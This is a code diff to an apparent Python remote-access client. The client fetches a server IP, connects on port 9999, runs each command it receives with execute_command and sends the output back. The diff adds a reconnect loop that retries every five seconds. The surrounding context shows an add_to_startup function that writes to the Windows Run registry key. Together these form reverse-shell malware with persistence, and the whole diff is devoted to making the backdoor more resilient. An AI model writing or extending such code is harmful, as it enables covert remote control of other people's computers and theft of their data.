@@ -22,22 +22,27 @@ def fetch_server_ip(url):
         return None
 
 def connect_to_server(server_ip, port=9999):
-    try:
-        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client_socket.connect((server_ip, port))
-        
-        while True:
-            command = client_socket.recv(1024)
-            if not command:
-                break  # Break the loop if no more data is received
-            if command.strip().lower() == b'exit':  # Decode and compare
-                break
-            output = execute_command(command.decode('utf-8').strip())
-            client_socket.sendall(output.encode('utf-8'))
-    except Exception as e:
-        print(f"Error occurred: {e}")
-    finally:
-        client_socket.close()
+    while True:
+        try:
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.connect((server_ip, port))
+            
+            while True:
+                command = client_socket.recv(1024)
+                if not command:
+                    break  # Break the loop if no more data is received
+                if command.strip().lower() == b'exit':  # Decode and compare
+                    break
+                output = execute_command(command.decode('utf-8').strip())
+                client_socket.sendall(output.encode('utf-8'))
+        except ConnectionResetError:
+            print("Server closed the connection.")
+            break
+        except Exception as e:
+            print(f"Error occurred: {e}")
+            time.sleep(5)  # Retry every 5 seconds if connection fails
+        finally:
+            client_socket.close()
 
 def add_to_startup(app_name, app_path):
     key = r'Software\Microsoft\Windows\CurrentVersion\Run'
